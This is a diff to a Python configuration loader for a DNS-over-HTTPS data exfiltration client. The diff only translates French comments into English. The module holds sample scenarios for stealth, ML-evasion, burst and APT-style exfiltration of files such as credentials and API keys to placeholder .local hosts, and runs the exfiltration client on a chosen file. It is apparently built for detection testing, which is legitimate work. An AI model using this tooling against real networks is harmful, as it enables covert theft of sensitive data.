@@ -2,8 +2,8 @@
 """
 JSON Configuration Loader for DoH Exfiltration
 
-Système de chargement de configurations JSON pour faciliter les tests d'évasion
-et permettre une configuration flexible des paramètres d'exfiltration.
+Configuration loading system for JSON files to facilitate evasion testing
+and allow flexible configuration of exfiltration parameters.
 """
 
 import json
@@ -17,29 +17,29 @@ from client import ExfiltrationConfig, EncodingType, TimingPattern, DoHExfiltrat
 logger = logging.getLogger(__name__)
 
 class JSONConfigLoader:
-    """Chargeur de configurations JSON pour DoH exfiltration"""
+    """JSON configuration loader for DoH exfiltration"""
     
     def __init__(self, config_dir: str = "test_configs"):
         self.config_dir = Path(config_dir)
         self.config_dir.mkdir(exist_ok=True)
         
-        # Créer des configurations d'exemple si elles n'existent pas
+        # Create sample configurations if they don't exist
         self._create_sample_configs()
     
     def load_config_from_file(self, config_path: str) -> Optional[ExfiltrationConfig]:
         """
-        Charge une configuration depuis un fichier JSON
+        Load configuration from a JSON file
         
         Args:
-            config_path: Chemin vers le fichier de configuration JSON
+            config_path: Path to the JSON configuration file
             
         Returns:
-            ExfiltrationConfig ou None si erreur
+            ExfiltrationConfig or None if error
         """
         try:
             config_file = Path(config_path)
             if not config_file.exists():
-                # Essayer dans le répertoire de configs
+                # Try in the configs directory
                 config_file = self.config_dir / config_path
                 if not config_file.exists():
                     logger.error(f"Configuration file not found: {config_path}")
@@ -57,13 +57,13 @@ class JSONConfigLoader:
     
     def load_test_scenario(self, scenario_name: str) -> Optional[Dict[str, Any]]:
         """
-        Charge un scénario de test complet avec configuration et paramètres
+        Load complete test scenario with configuration and parameters
         
         Args:
-            scenario_name: Nom du scénario à charger
+            scenario_name: Name of the scenario to load
             
         Returns:
-            Dictionnaire avec config, test_files, et métadonnées
+            Dictionary with config, test_files, and metadata
         """
         try:
             scenario_file = self.config_dir / f"{scenario_name}.json"
@@ -74,7 +74,7 @@ class JSONConfigLoader:
             with open(scenario_file, 'r', encoding='utf-8') as f:
                 scenario_data = json.load(f)
             
-            # Convertir la configuration
+            # Convert configuration
             if 'exfiltration_config' in scenario_data:
                 config = self._json_to_config(scenario_data['exfiltration_config'])
                 scenario_data['exfiltration_config'] = config
@@ -88,15 +88,15 @@ class JSONConfigLoader:
     def save_config_to_file(self, config: ExfiltrationConfig, filename: str, 
                            metadata: Optional[Dict[str, Any]] = None) -> bool:
         """
-        Sauvegarde une configuration dans un fichier JSON
+        Save configuration to a JSON file
         
         Args:
-            config: Configuration à sauvegarder
-            filename: Nom du fichier (avec ou sans .json)
-            metadata: Métadonnées additionnelles
+            config: Configuration to save
+            filename: Filename (with or without .json)
+            metadata: Additional metadata
             
         Returns:
-            True si succès, False sinon
+            True if success, False otherwise
         """
         try:
             if not filename.endswith('.json'):
@@ -119,14 +119,14 @@ class JSONConfigLoader:
             return False
     
     def list_available_configs(self) -> List[str]:
-        """Liste toutes les configurations disponibles"""
+        """List all available configurations"""
         config_files = []
         for file in self.config_dir.glob("*.json"):
             config_files.append(file.stem)
         return sorted(config_files)
     
     def validate_config(self, config_data: Dict[str, Any]) -> bool:
-        """Valide une configuration JSON"""
+        """Validate JSON configuration"""
         required_fields = ['doh_server', 'target_domain', 'chunk_size']
         
         for field in required_fields:
@@ -134,7 +134,7 @@ class JSONConfigLoader:
                 logger.error(f"Missing required field: {field}")
                 return False
         
-        # Valider les énumérations
+        # Validate enumerations
         if 'encoding' in config_data:
             valid_encodings = [e.value for e in EncodingType]
             if config_data['encoding'] not in valid_encodings:
@@ -150,12 +150,12 @@ class JSONConfigLoader:
         return True
     
     def _json_to_config(self, config_data: Dict[str, Any]) -> ExfiltrationConfig:
-        """Convertit un dictionnaire JSON en ExfiltrationConfig"""
-        # Valider d'abord
+        """Convert JSON dictionary to ExfiltrationConfig"""
+        # Validate first
         if not self.validate_config(config_data):
             raise ValueError("Invalid configuration data")
         
-        # Convertir les énumérations
+        # Convert enumerations
         encoding = EncodingType.BASE64
         if 'encoding' in config_data:
             encoding = EncodingType(config_data['encoding'])
@@ -164,7 +164,7 @@ class JSONConfigLoader:
         if 'timing_pattern' in config_data:
             timing_pattern = TimingPattern(config_data['timing_pattern'])
         
-        # Créer la configuration avec des valeurs par défaut
+        # Create configuration with default values
         config = ExfiltrationConfig(
             doh_server=config_data.get('doh_server', 'https://doh.local/dns-query'),
             target_domain=config_data.get('target_domain', 'exfill.local'),
@@ -191,7 +191,7 @@ class JSONConfigLoader:
         return config
     
     def _config_to_json(self, config: ExfiltrationConfig) -> Dict[str, Any]:
-        """Convertit une ExfiltrationConfig en dictionnaire JSON"""
+        """Convert ExfiltrationConfig to JSON dictionary"""
         return {
             'doh_server': config.doh_server,
             'target_domain': config.target_domain,
@@ -216,12 +216,12 @@ class JSONConfigLoader:
         }
     
     def _create_sample_configs(self):
-        """Crée des configurations d'exemple pour les tests d'évasion"""
+        """Create sample configurations for evasion testing"""
         
-        # Configuration classique (facilement détectable)
+        # Classic configuration (easily detectable)
         classic_config = {
             "name": "Classic Exfiltration",
-            "description": "Configuration classique facilement détectable pour tests de base",
+            "description": "Classic easily detectable configuration for basic tests",
             "exfiltration_config": {
                 "doh_server": "https://doh.local/dns-query",
                 "target_domain": "exfill.local",
@@ -235,13 +235,13 @@ class JSONConfigLoader:
             },
             "test_files": ["sample.txt", "credentials.json"],
             "detection_expected": True,
-            "notes": "Configuration de base pour validation du système de détection"
+            "notes": "Basic configuration for detection system validation"
         }
         
-        # Configuration furtive avancée
+        # Advanced stealth configuration
         stealth_config = {
             "name": "Advanced Stealth",
-            "description": "Configuration furtive avancée pour évasion ML",
+            "description": "Advanced stealth configuration for ML evasion",
             "exfiltration_config": {
                 "doh_server": "https://doh.local/dns-query",
                 "target_domain": "cdn-assets.local",
@@ -261,13 +261,13 @@ class JSONConfigLoader:
             },
             "test_files": ["database_dump.sql", "api_keys.json"],
             "detection_expected": False,
-            "notes": "Techniques d'évasion avancées : petits chunks, timing variable, chiffrement"
+            "notes": "Advanced evasion techniques: small chunks, variable timing, encryption"
         }
         
-        # Configuration rapide en rafales
+        # Fast burst configuration
         burst_config = {
             "name": "Burst Attack",
-            "description": "Attaque rapide en rafales pour test de détection temporelle",
+            "description": "Fast burst attack for temporal detection testing",
             "exfiltration_config": {
                 "doh_server": "https://doh.local/dns-query",
                 "target_domain": "cache-service.local",
@@ -283,13 +283,13 @@ class JSONConfigLoader:
             },
             "test_files": ["large_dataset.csv", "backup.zip"],
             "detection_expected": True,
-            "notes": "Pattern de rafales pour tester la détection d'anomalies temporelles"
+            "notes": "Burst pattern to test temporal anomaly detection"
         }
         
-        # Configuration APT (persistance longue)
+        # APT configuration (long persistence)
         apt_config = {
             "name": "APT Simulation",
-            "description": "Simulation d'APT avec exfiltration très lente et discrète",
+            "description": "APT simulation with very slow and discreet exfiltration",
             "exfiltration_config": {
                 "doh_server": "https://doh.local/dns-query",
                 "target_domain": "update-service.local",
@@ -313,13 +313,13 @@ class JSONConfigLoader:
             },
             "test_files": ["financial_records.xlsx", "employee_data.csv"],
             "detection_expected": False,
-            "notes": "Simulation APT : très lents délais, rotation domaines, chiffrement"
+            "notes": "APT simulation: very slow delays, domain rotation, encryption"
         }
         
-        # Configuration de test de vitesse
+        # Speed test configuration
         speed_test_config = {
             "name": "Speed Test",
-            "description": "Configuration optimisée pour la vitesse maximale",
+            "description": "Configuration optimized for maximum speed",
             "exfiltration_config": {
                 "doh_server": "https://doh.local/dns-query",
                 "target_domain": "fast-cdn.local",
@@ -336,10 +336,10 @@ class JSONConfigLoader:
             },
             "test_files": ["speed_test_file.bin"],
             "detection_expected": True,
-            "notes": "Configuration pour mesurer la vitesse maximale d'exfiltration"
+            "notes": "Configuration to measure maximum exfiltration speed"
         }
         
-        # Sauvegarder les configurations d'exemple
+        # Save sample configurations
         configs = {
             'classic': classic_config,
             'stealth': stealth_config,
@@ -357,17 +357,17 @@ class JSONConfigLoader:
     def create_custom_test_config(self, name: str, file_size: int, 
                                 target_speed: str = "balanced") -> str:
         """
-        Crée une configuration personnalisée basée sur la taille du fichier et la vitesse cible
+        Create custom configuration based on file size and target speed
         
         Args:
-            name: Nom de la configuration
-            file_size: Taille du fichier en bytes
+            name: Configuration name
+            file_size: File size in bytes
             target_speed: "fast", "balanced", "stealth"
             
         Returns:
-            Nom du fichier de configuration créé
+            Name of the created configuration file
         """
-        # Paramètres basés sur la taille du fichier et la vitesse cible
+        # Parameters based on file size and target speed
         if target_speed == "fast":
             if file_size < 1024:  # < 1KB
                 chunk_size = 25
@@ -425,10 +425,10 @@ class JSONConfigLoader:
             encryption = True
             randomization = True
         
-        # Créer la configuration
+        # Create configuration
         custom_config = {
             "name": f"Custom {name} ({target_speed})",
-            "description": f"Configuration automatique pour fichier de {file_size} bytes, vitesse {target_speed}",
+            "description": f"Automatic configuration for {file_size} bytes file, {target_speed} speed",
             "generated": True,
             "file_size": file_size,
             "target_speed": target_speed,
@@ -446,7 +446,7 @@ class JSONConfigLoader:
             }
         }
         
-        # Ajouter les paramètres spécifiques selon le timing
+        # Add specific parameters according to timing
         if timing == "burst":
             custom_config["exfiltration_config"]["burst_size"] = burst_size
             custom_config["exfiltration_config"]["burst_delay"] = 1.0
@@ -457,7 +457,7 @@ class JSONConfigLoader:
         elif timing == "random":
             custom_config["exfiltration_config"]["delay_variance"] = delay_variance
         
-        # Sauvegarder
+        # Save
         filename = f"custom_{name}_{target_speed}.json"
         config_file = self.config_dir / filename
         
@@ -470,17 +470,17 @@ class JSONConfigLoader:
 
 def run_test_with_config(config_file: str, test_file: str) -> bool:
     """
-    Exécute un test d'exfiltration avec une configuration JSON
+    Execute exfiltration test with JSON configuration
     
     Args:
-        config_file: Chemin vers le fichier de configuration JSON
-        test_file: Fichier à exfiltrer
+        config_file: Path to JSON configuration file
+        test_file: File to exfiltrate
         
     Returns:
-        True si succès, False sinon
+        True if success, False otherwise
     """
     try:
-        # Charger la configuration
+        # Load configuration
         loader = JSONConfigLoader()
         scenario = loader.load_test_scenario(config_file.replace('.json', ''))
         
@@ -490,7 +490,7 @@ def run_test_with_config(config_file: str, test_file: str) -> bool:
         
         config = scenario['exfiltration_config']
         
-        # Créer le client et exécuter
+        # Create client and execute
         client = DoHExfiltrationClient(config)
         
         logger.info(f"Starting exfiltration with config: {scenario['name']}")
@@ -500,9 +500,9 @@ def run_test_with_config(config_file: str, test_file: str) -> bool:
         success = client.exfiltrate_file(test_file)
         
         if success:
-            logger.info("✅ Exfiltration completed successfully")
+            logger.info("Exfiltration completed successfully")
         else:
-            logger.error("❌ Exfiltration failed")
+            logger.error("Exfiltration failed")
         
         return success
         
@@ -512,47 +512,47 @@ def run_test_with_config(config_file: str, test_file: str) -> bool:
 
 
 def main():
-    """Démonstration du chargeur de configurations JSON"""
-    print("📝 JSON Configuration Loader for DoH Exfiltration")
+    """JSON configuration loader demonstration"""
+    print("JSON Configuration Loader for DoH Exfiltration")
     print("=" * 60)
     
-    # Configurer le logging
+    # Configure logging
     logging.basicConfig(level=logging.INFO, 
                        format='%(asctime)s - %(levelname)s - %(message)s')
     
-    # Créer le chargeur
+    # Create loader
     loader = JSONConfigLoader()
     
-    # Lister les configurations disponibles
+    # List available configurations
     configs = loader.list_available_configs()
-    print(f"\n📋 Available configurations: {len(configs)}")
+    print(f"\nAvailable configurations: {len(configs)}")
     for config in configs:
         print(f"   • {config}.json")
     
-    # Tester le chargement d'une configuration
-    print(f"\n🔧 Testing configuration loading...")
+    # Test configuration loading
+    print(f"\nTesting configuration loading...")
     test_config = loader.load_config_from_file('classic.json')
     if test_config:
-        print(f"✅ Loaded classic config:")
+        print(f"Loaded classic config:")
         print(f"   - Chunk size: {test_config.chunk_size}")
         print(f"   - Encoding: {test_config.encoding.value}")
         print(f"   - Timing: {test_config.timing_pattern.value}")
     
-    # Créer une configuration personnalisée
-    print(f"\n🎯 Creating custom configuration...")
+    # Create custom configuration
+    print(f"\nCreating custom configuration...")
     custom_file = loader.create_custom_test_config("demo", 5000, "balanced")
-    print(f"✅ Created: {custom_file}")
+    print(f"Created: {custom_file}")
     
-    # Tester un scénario complet
-    print(f"\n🧪 Testing full scenario loading...")
+    # Test full scenario loading
+    print(f"\nTesting full scenario loading...")
     scenario = loader.load_test_scenario('stealth')
     if scenario:
-        print(f"✅ Loaded stealth scenario:")
+        print(f"Loaded stealth scenario:")
         print(f"   - Name: {scenario['name']}")
         print(f"   - Description: {scenario['description']}")
         print(f"   - Detection expected: {scenario['detection_expected']}")
     
-    print(f"\n💡 Usage examples:")
+    print(f"\nUsage examples:")
     print(f"   python json_config_loader.py")
     print(f"   python quick_test.py --config stealth.json file.txt")
     print(f"   python client.py --json-config custom_demo_balanced.json")
